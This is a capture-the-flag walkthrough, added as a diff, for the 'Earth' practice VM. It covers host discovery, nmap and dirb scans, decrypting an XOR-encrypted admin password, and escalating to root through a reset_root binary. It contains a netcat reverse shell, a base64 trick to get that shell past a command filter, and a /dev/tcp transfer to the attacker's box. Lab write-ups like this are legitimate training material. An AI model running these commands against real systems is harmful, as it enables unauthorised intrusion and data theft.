@@ -1,0 +1,100 @@
+EARTH CTF
+-----------------------
+
+--> netdiscover -r 10.0.2.0/24
+
+*** we get 4 IP addresses back as the result. of which 10.0.2.7 is the IP of the target machine ***
+*** run an nmap scan on the target machine ***
+
+--> nmap -p- -sV -oN terra.txt 10.0.2.7
+
+*** we can see that openssh is running on port 22, http on 80 and ssl/http on 443 [Apache HTTPD runs on both] ***
+*** try to hit the ip from the browser and it returns a bad request when using HTTP ***
+*** we get a webpage when we try to hit it using https  and we can infer the following ***
+	>> there is a working webserver on the box running Fedora
+	>> No useable info at the moment.
+*** we can either look for exploits on fedora using metasploit or do a directory scan to see of anything usable comes up ***
+
+--> dirb https://10.0.2.7
+
+*** we have 1 optput "cgi-bin". lets try hitting it from the browser and see if there is something we can use ***
+*** we do not have permissions to access https://10.0.2.7/cgi-bin/ ***
+*** look through the page source and certificates ***
+*** NOthing useful in the pagesource. look for website certificates. since ssl.http is running on 443 we should have ssl certificates ***
+*** we can do this by doing an NMAP scan  ***
+
+--> nmap -p- -sV -sC -oN terra.txt 10.0.2.7
+
+*** we can see 2 DNS hostnames under port 443 ***
+*** try adding the host names to the /etc/hosts file in KALI box to see if the webpage returned changes ***
+
+--> sudo nano /etc/hosts
+	>> 10.0.2.7 earth.local terratest.earth.local
+
+*** hit the following url from the browser https://earth.local/ and we get a different website with some encrypted content at the bottom ***
+*** Check for any directories that can be used in earth.local and terratest.earth.local ***
+
+--> dirb https://earth.local [returns 2 retults admin and cgi-bin]
+ 
+*** admin page has a login function but there was no clue to what the user id or password would be. cgi-bin was a bust ***
+
+--> dirb https://terratest.earth.local [3 results cgi-bin, index.html and robots.txt]
+
+*** robots.txt has an entry called testingnotes. check if it has any actionable intel ***
+
+--> https://terratest.earth.local/testingnotes.txt [we get a few lines of text as result]
+
+*** we get the following inputs ***
+	>> XOR encryption is being used
+	>> user name for admin portal is terra
+	>> testdata.txt was used to test the encryption so it could be the key
+
+*** try and use testdata.txt to decrypt the messages from earth.local through CyberChef ***
+*** from the third encrypted message we get earthclimatechangebad4humans as a repeating string. this could be the password ***
+*** try the username and password on login page. We are abel to login with terra and earthclimatechangebad4humans ***
+*** we now have a CLI in the Earth box. TRy running linux commands ***
+*** we found the user flag from /var/earth_web ***
+
+--> user_flag_3353b67d6437f07ba7d34afd7d2fc27d
+
+*** try and obtain a reverse shell from the CLI to the Kali box using netcat. set up a listener on kali using netcat first ***
+
+--> nc -l -v -n -p 4444
+--> nc -e /bin/bash 10.0.2.15 4444 [on the cli ui]
+
+*** we get a warning that remote connections are forbidden. reverse shell wont work we can bypass this by encoding the command using base64
+	and running a command that the decode the encoded command in the cli which  will cause the execution of the first command ***
+
+--> echo "nc -e /bin/bash 10.0.2.15 4444" | base64 [bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi4xNSA0NDQ0Cg==]
+
+*** decode in the CLI ***
+
+--> echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi4xNSA0NDQ0Cg==" | base64 -d | bash
+
+*** upon successful execution of the above command we have a connection ***
+*** check the directories and folders one by one to see if there is something  we can use to gain root access ***
+*** under /usr/bin there is a file called reset_root ***
+*** running the reset_root script failed with an error. move the script to our kalibox for further analysis ***
+
+--> cat /usr/bin/reset_root > /dev/tcp/10.0.2.15/3333
+--> nc -lvnp 3333 > reset_root [on a new terminal in kali]
+
+*** File is still not readable. Use ltrace to find out why.  ***
+
+--> ltrace ./reset_root
+
+*** create the 3 files in our target ***
+
+--> touch /dev/shm/kHgTFI5G
+--> touch /dev/shm/Zw7bV9U5
+--> touch /tmp/kcM0Wewe
+
+*** run reset_root in the target system ***
+*** root password changed to Earth. Login as root ***
+--> su root [Earth]
+
+--> cat /root/root_flag.txt
+
+
+
+
